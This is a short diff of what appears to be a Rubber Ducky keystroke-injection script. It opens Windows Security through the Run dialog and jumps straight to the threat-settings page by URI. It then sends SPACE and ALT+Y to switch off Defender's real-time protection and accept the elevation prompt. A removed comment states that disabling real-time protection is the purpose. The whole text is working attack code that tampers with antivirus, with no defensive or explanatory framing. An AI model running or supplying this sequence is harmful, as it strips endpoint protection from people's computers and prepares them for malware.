@@ -10,19 +10,9 @@ DEFAULT_DELAY 100
 REM open Windows Security GUI.
 GUI r
 DELAY 1000
-STRING windowsdefender:
+STRING windowsdefender://threatsettings
 ENTER
 DELAY 5000
-
-REM run through option list and turn RT-protection off.
-ENTER
-DELAY 1500
-TAB
-TAB
-TAB
-TAB
-ENTER
-DELAY 1500
 SPACE
 DELAY 3000
 ALT y
